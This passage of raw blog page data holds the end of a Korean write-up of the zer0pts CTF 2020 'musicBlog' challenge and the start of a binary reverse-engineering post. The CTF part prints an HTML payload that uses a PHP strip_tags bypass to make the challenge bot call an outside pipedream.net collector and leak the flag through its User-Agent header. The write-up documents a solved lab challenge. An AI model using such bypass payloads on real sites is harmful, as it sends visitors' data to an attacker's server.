그렇다면 a태그를 사용하여 외부 서버로 요청을 보내게 되면 <code class=\"language-text\">user-agent</code> 헤더 부분을 읽을 수 있지 않을까?</li>\n<li>그렇다면 앞에서 분석해본 <code class=\"language-text\">work.js</code> 에서는 <code class=\"language-text\">newPage()</code> 메서드를 통해 생성을 한 후에 <code class=\"language-text\">UserAgent</code>를 바탕으로 적용을 한후 <code class=\"language-text\">id: like</code> 이벤트가 발생하였을 경우 적용된 resource를 받을 수 있기 때문에 페이로드를 짤때 <code class=\"language-text\">id</code> 값을 like로 적용을 한 후에 보내야 한다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\">&lt;a/udio href=\"https://11973bb238cad6a84c369c6b0060ed0b.m.pipedream.net\" id=\"like\">\n\t EXPLOIT &lt;/a/udio></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAAAqElEQVQY05WOTQoCMQyFe/8zeAMP4kbwCMLgzHLGNk2aJm0idSEKIs7jW7zN+wnTNM3LcpuXUtjdbQ+BCnVtI7ZfAbBwEZGmzbT7n0j3bh62RPEeARAixDWmNcb1Psw2yFgycUbOmd7bpXltHnhc3i1zr+rBuooqkOQiyMpqL+qz/iusXtXC8cKXa2KClAAAEJGeQiIR+b0fDmc/TcN1+zxmxlWL/go/ADrk1fvGz35+AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./9.png\"\n        title=\"./9.png\"\n        src=\"/static/5925085382a019bef00f6cfb3c7e5a10/37523/9.png\"\n        srcset=\"/static/5925085382a019bef00f6cfb3c7e5a10/e9ff0/9.png 180w,\n/static/5925085382a019bef00f6cfb3c7e5a10/f21e7/9.png 360w,\n/static/5925085382a019bef00f6cfb3c7e5a10/37523/9.png 720w,\n/static/5925085382a019bef00f6cfb3c7e5a10/302a4/9.png 1080w,\n/static/5925085382a019bef00f6cfb3c7e5a10/33d1d/9.png 1150w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 598px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 21.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAq0lEQVQI13XOSw6CMBSFYVYC9FZKi0BEKZSHvGpbizpwYOL+V2KsMXHiN/rP7HhRTCOWEJqwmGQEpwkteE3TPPB92EQ4pmEQhD8QCpEDAF7VHvuTnfSql0lOQ982Tde3w9i8CSFE13Wtq88uq5pzLvihKPbeLOX98bSX23K+2nVVjtHafFlrjTFKKe0sUkkplZyHcfLiNGe7kiZpxgihLNpmCAD9B+4wAGCMX2t2LzqYqHAFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./10.png\"\n        title=\"./10.png\"\n        src=\"/static/f42b5fa9b65c2792c3586823a8f9b852/0c69d/10.png\"\n        srcset=\"/static/f42b5fa9b65c2792c3586823a8f9b852/e9ff0/10.png 180w,\n/static/f42b5fa9b65c2792c3586823a8f9b852/f21e7/10.png 360w,\n/static/f42b5fa9b65c2792c3586823a8f9b852/0c69d/10.png 598w\"\n        sizes=\"(max-width: 598px) 100vw, 598px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"response-event-확인\" style=\"position:relative;\"><a href=\"#response-event-%ED%99%95%EC%9D%B8\" aria-label=\"response event 확인 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>response Event 확인</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 46.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAyElEQVQoz5WQjYrEIAyE+/5Pem01ibZq/rSHWzi4Y9lyQzQifszEJecDKTUWVTUWY/E+vPd7N5+yV7vP7n2u3scYi6oiEGx73TZDspS8VWd25u4+PmoRVUJqIfLXKuumABKC7EEBlMhLUUpe27iuN7CqAhKmLCEapfnornGNV7aPziKASJRaPqTxvPvh37n9dQ4RMlHZ97JuEqOV02udJfIAu3kECIAN0SLYeczfmnB7hlkEI6SU23F2ll+ZH2OnnOtZrnvUf+obqfcQIgskkW0AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./11.png\"\n        title=\"./11.png\"\n        src=\"/static/806732ee76eb47722ae809c7b3674d74/37523/11.png\"\n        srcset=\"/static/806732ee76eb47722ae809c7b3674d74/e9ff0/11.png 180w,\n/static/806732ee76eb47722ae809c7b3674d74/f21e7/11.png 360w,\n/static/806732ee76eb47722ae809c7b3674d74/37523/11.png 720w,\n/static/806732ee76eb47722ae809c7b3674d74/bf433/11.png 971w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>응답 결과 헤더 라인에 user-agent 속성에서 FLAG 값을 확인할 수 있다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#dockerfile-%EB%B6%84%EC%84%9D\">DockerFile 분석</a></li>\n<li><a href=\"#flag-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%B0%BE%EA%B8%B0\">flag 문자열 찾기</a></li>\n<li><a href=\"#samplepage\">SamplePage</a></li>\n<li><a href=\"#postphp-%EB%B6%84%EC%84%9D\">post.php 분석</a></li>\n<li><a href=\"#utilphp-%EB%B6%84%EC%84%9D\">util.php 분석</a></li>\n<li><a href=\"#strip_tags-allows--in-tag-name-allowing-whitelist-bypass-in-browsers\">strip_tags allows / in tag name, allowing whitelist bypass in browsers</a></li>\n<li><a href=\"#php-bug-%ED%85%8C%EC%8A%A4%ED%8A%B8\">PHP Bug 테스트</a></li>\n<li><a href=\"#response-event-%ED%99%95%EC%9D%B8\">response Event 확인</a></li>\n</ul>\n</div>","excerpt":"취약점 분석 Name\nmusicBlog Description\nYou can introduce favorite songs to friends with MusicBlog! File\nMusicBlog.tar.gz DockerFile 분석  PHP 7.4.0 버전을 사용하는 것을 확인할 수 있으며 해당 버전에 맞는 버그를 바탕으로 flag를 획득할 수 있겠다. 함수의  앞에 async 라는 예약어를 붙인후, 함수 내부에서 비동기 처리가 필요한 메서드에 await를 붙여준다. await 붙인 메서드는 비동기 처리 메서드가 꼭 promise 객체를 반환해야 await가 의도한 대로 동작한다. flag 문자열 찾기  flag 문자열을 검색하여  소스코드를 확인할 수 있다. 해당 코드를 보면 재선언, 재할당이 불가능하도록 설정되어 있다.  setUserAgent 메서드를 바탕으로 flag 값을 UserAgent로 설정하는 것을 확인할 수 있다. SamplePage   Sample Page 분석시…","frontmatter":{"date":"August 24, 2020","title":"zer0pts ctf 2020 - musicBlof 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🥓"},"fields":{"slug":"/zer0pts_music_ctf_writeup/"}},"next":{"id":"5bf3a490-6be2-5a4e-a67f-26780fb4cf94","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-실행-결과\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%8B%A4%ED%96%89-%EA%B2%B0%EA%B3%BC\" aria-label=\"바이너리 실행 결과 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 실행 결과</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAjUlEQVQI152KyQ2DMBREXUZO3rdvwmZjwBgJieSSFtJ/IZFN0kCkp5HmzaD9ePg5hWVbl+TyKbbTh6kdpz7EdgxDiL2Pc8o+7utxf71v+am47pohUAVIQUcVMA204KhumHYVYMW7K7luuAEBhhlLZDFEWoSFIdJiaYm0RBgiDC7UKu13/cmLakqi6/QfH2jqJZrVTugXAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/6ad0125884e469a9350fa38de0d04d56/37523/0.png\"\n        srcset=\"/static/6ad0125884e469a9350fa38de0d04d56/e9ff0/0.png 180w,\n/static/6ad0125884e469a9350fa38de0d04d56/f21e7/0.png 360w,\n/static/6ad0125884e469a9350fa38de0d04d56/37523/0.png 720w,\n/static/6ad0125884e469a9350fa38de0d04d56/078fe/0.png 934w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>입력 대기중 😑</li>\n</ul>\n<h2 id=\"바이너리-정보\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EC%A0%95%EB%B3%B4\" aria-label=\"바이너리 정보 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>바이너리 정보</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 51.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAIAAAA7N+mxAAAACXBIWXMAAAsTAAALEwEAmpwYAAABkElEQVQozz2SCY7bMAxF5zRtEi9aSYpavSR2JnGaGbT3P0shuyjwAQGf/4kkwI8w3OZ1sy5SKBgK+oyhWM4KowQWxknLCr3PM+fZuCitE4Z2M3zEcQnlihwNsgGnLLlQpuVJcUCOGtzPSyc0PN5/yvUTOFryeo8p9B9huJXrZw013anpf5xbad0evRv0nTSnRvQKH79+D7eHpSA0dNIKDbWzL9c0rQa56dWlk+dWKOD5/rKcNbjDERrX7SvPqyV/6eSp6VuhK8x54jxr5Esnj4KhsDzemoJBf8DS0H37tpzBxWZ3WmGOnW9pWgyyJW/JN73SwHm6K/AG+dyKU9P3Cu6v73F5kM/S0rkV505WGHyhOAhDhzqNwHlcngoDuHDs0mu4Pd5pXNCnWCZwtU2FJdQHfPkvF0fOcx2Sk8agwFMYpnVDX6xLFAYXB05ThSmO4/I0Lhna5ZJ1qZL7RxgG8MWX6/p8z+uWplVTtHv4HzyvL0P1SCgM9VQ49Ro7CZ2EVkIjrOW0bl/zurk0HZMe+gt7OIQogoUZfQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./1.png\"\n        title=\"./1.png\"\n        src=\"/static/0c34d274013459e1eb882e5286557a7b/37523/1.png\"\n        srcset=\"/static/0c34d274013459e1eb882e5286557a7b/e9ff0/1.png 180w,\n/static/0c34d274013459e1eb882e5286557a7b/f21e7/1.png 360w,\n/static/0c34d274013459e1eb882e5286557a7b/37523/1.png 720w,\n/static/0c34d274013459e1eb882e5286557a7b/42d54/1.png 858w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h2 id=\"main-함수-분석\" style=\"position:relative;\"><a href=\"#main-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"main 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>main 함수 분석</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAIAAAB2/0i6AAAACXBIWXMAAAsTAAALEwEAmpwYAAABgElEQVQY00WQ2WrbQBhG/SCFYlmzjyTLiuxYWVzoE8QEU3eBlpbelD50aRI7iqyxJEszo8VTHIUGzsW5OfD9/2DzmP/5Gz/cbzbb9GmXPcWxEGKXlV++/UTcdf0zzD1IHURdRF1InZMzF1AncP1B15q2PUp5TPcH1ejj0dSNNsZ8+vodEM4mU0C4jSjA7IXeEbUxG1RVXddtVTU7UW4TkeYiFo/7Mrv5sKZe4AfTESQjSIY2GtrIAtgCuBeA2cAY0zRdklR3d3kiCqWVqmTXmeXq44h5k8vr4Dyanl+OJyF3fcI96oy552Pq2Ii+xCKVm21eFPpwKIVIpdLL1Roxl8/mOAj9cMZc//9ySJiN6GucZXobF1LXWdbmuTLGLFfrt9Sxoisyj5g/tiDpN1sA94e8xklS3T8UoijyXMnyFN+uP7+xbEQdiDns//SMDclwBC2ATnFRKK3btu3qppGqLnWZyb3q1I9fv2cX76LF+7Po+plFz2R+FUYLL5yPpxf/AAc57aIwKh0OAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./2.png\"\n        title=\"./2.png\"\n        src=\"/static/65dd55752bf6d4781d8917b03dc549c7/37523/2.png\"\n        srcset=\"/static/65dd55752bf6d4781d8917b03dc549c7/e9ff0/2.png 180w,\n/static/65dd55752bf6d4781d8917b03dc549c7/f21e7/2.png 360w,\n/static/65dd55752bf6d4781d8917b03dc549c7/37523/2.png 720w,\n/static/65dd55752bf6d4781d8917b03dc549c7/abe2a/2.png 1067w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">Python<span class=\"token operator\">></span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>end<span class=\"token operator\">-</span>fisrt<span class=\"token punctuation\">)</span>\n0x18fL\nPython<span class=\"token operator\">></span><span class=\"token number\">0x18f</span>\n<span class=\"token number\">399</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">0x14</code> 번 루틴을 돌면서 <code class=\"language-text\">read</code> 함수를 바탕으로 입력을 받는다. 입력을 받을시 해당 <code class=\"language-text\">unk_212E0</code> 버퍼를 사용하는데 해당 사이즈는 400바이트임을 계산할 수 있다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 660px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 30.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAIAAABM9SnKAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA4UlEQVQY002P0W7DIAxF8/8f2JdKLWoTkiqEYUywIYAnlq3rkZ9sHfneIeckIq1JrUKUASjn0j44cjmOggk9ezrIs88ln6dB6/x4iLV99v3wnlsTAPY+WUvThAAJPL3soletV73CGjnKD8PtlqZJmCWE/vzEmOh9Gke43+22xRCS3azdrPtyTCx/DEodl4soJcvyG15E1nVH5Hkm9QQA6rERMSAzl9JLveV0vco4yuvV5XNvTNy2OE1RKWytlVIAABGdc2+zy8aUee6FnfuPHULa9+RcZe6rWmuMkZmJ6FP+BhguWgi+/6MsAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./3.png\"\n        title=\"./3.png\"\n        src=\"/static/01616dc0e018246951c86e61b13d47c8/1f083/3.png\"\n        srcset=\"/static/01616dc0e018246951c86e61b13d47c8/e9ff0/3.png 180w,\n/static/01616dc0e018246951c86e61b13d47c8/f21e7/3.png 360w,\n/static/01616dc0e018246951c86e61b13d47c8/1f083/3.png 660w\"\n        sizes=\"(max-width: 660px) 100vw, 660px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>루틴을 돌면서 400바이트 입력을 받은후 해당 <code class=\"language-text\">unk_212E0</code> 를 인자로 하여 <code class=\"language-text\">sub_850</code> 함수를 호출한후 해당 반환 값을 0이 아닐경우 FLAG 값을 출력하는 것을 확인할 수 있다.</li>\n<li>출력 중간 사이에 <code class=\"language-text\">sub_10FF6</code> 함수가 보일텐데 해당 함수는</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 25.555555555555554%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoElEQVQY022OSQ7CMBAE8/+v8QSEpYglIjDBHjuzJfYgQHAhde1uVXfjKETemps5sxMtOWtCXmt19/WLb9GFIH3vKfmngCiPSfrT/ZrAbBVhEVXV1trG+HCYz+eX9pOWogn1cpHhBrFkmml+o6qbZgvBh+FnVoB87HcRoJRFRZh40aWudWMMIIg+TR6jMptZZRJ47LMgGUeKiRMKZs3/z59LJCKjEZh+bwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./4.png\"\n        title=\"./4.png\"\n        src=\"/static/7de64c55e6188ed584d5d9f3c2bce6c8/37523/4.png\"\n        srcset=\"/static/7de64c55e6188ed584d5d9f3c2bce6c8/e9ff0/4.png 180w,\n/static/7de64c55e6188ed584d5d9f3c2bce6c8/f21e7/4.png 360w,\n/static/7de64c55e6188ed584d5d9f3c2bce6c8/37523/4.png 720w,\n/static/7de64c55e6188ed584d5d9f3c2bce6c8/94829/4.png 878w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">SHA256</code>으로 해쉬화 하여 출력을 한다 즉, 해당 함수는 출력을 해쉬화 하는 과정이고 우리가 알아야 할 것은 어떤 걸 해쉬화를 하는지 입력 값을 바탕으로 어떤 조건을 통해 해쉬화 가되어지는지를 알아야 한다.</li>\n</ul>\n<h2 id=\"sub_850-함수-분석\" style=\"position:relative;\"><a href=\"#sub_850-%ED%95%A8%EC%88%98-%EB%B6%84%EC%84%9D\" aria-label=\"sub_850 함수 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sub_850 함수 분석</h2>\n<p><strong>_start</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 24.444444444444443%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAIAAADKYVtkAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA6ElEQVQY0zXOX0+DMBQFcL7/5zFq5E2ikGxLbDJHmEU2lyoNFAOl0H/ca8rc7+G8nXtudCzEdvu92zFKZduic7gsIQEQEYWYxtEKobSxiAgAyw0ARJtN+hQ/xPEdIR/7PZYlUIpS4hXn46RceWpzfmyGTkqttTarUCZvJElekuQ5z7+qCrsOlArjV02jlHKflWBtLdU0z6FmrTXGeO+jw+E9TdMse6WUlSWez8A5rh+G7LpJKdfUv0vfTMqPo/fe+VVYzrL0MbgnhOY5VhVcLqj1/zJjQ9/bohhOPzXj7TBoY+w8z7De/gNlBRXW+OY/BwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./5.png\"\n        title=\"./5.png\"\n        src=\"/static/ca4606e1ae6534fbba55a9b7d14be3ae/37523/5.png\"\n        srcset=\"/static/ca4606e1ae6534fbba55a9b7d14be3ae/e9ff0/5.png 180w,\n/static/ca4606e1ae6534fbba55a9b7d14be3ae/f21e7/5.png 360w,\n/static/ca4606e1ae6534fbba55a9b7d14be3ae/37523/5.png 720w,\n/static/ca4606e1ae6534fbba55a9b7d14be3ae/cab8c/5.png 744w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>_end</strong></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAIAAAABPYjBAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoUlEQVQI14WNQQqDMBBFPUAv1CP0Kj2hBangCSxUuxVcSKAkaTJJHDPJlCq2y77d+/zPL8ry0rY3IcgYnmdmzswZMQKglDiOYRi8NcEaCxZooZxySolXirq+9n2HSJuHEAFmxIgYc94yVk5JkAqUeAntNO8UTXN49Efvn6tmANKapEzThN+SBfv59aCtdsH9xlV16u5nIr2PlxAoRvae//IGcxXjEPKxQP4AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./6.png\"\n        title=\"./6.png\"\n        src=\"/static/fbc803d74f80bf0bbc5b71df1bd25948/37523/6.png\"\n        srcset=\"/static/fbc803d74f80bf0bbc5b71df1bd25948/e9ff0/6.png 180w,\n/static/fbc803d74f80bf0bbc5b71df1bd25948/f21e7/6.png 360w,\n/static/fbc803d74f80bf0bbc5b71df1bd25948/37523/6.png 720w,\n/static/fbc803d74f80bf0bbc5b71df1bd25948/fe9f1/6.png 883w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>무려 시작과 끝의 옵셋 차이가 67493이 가 나는 함수 영역이다. …</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 639px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 41.66666666666667%; position: relative; bottom: 0; left: 0; background-image: 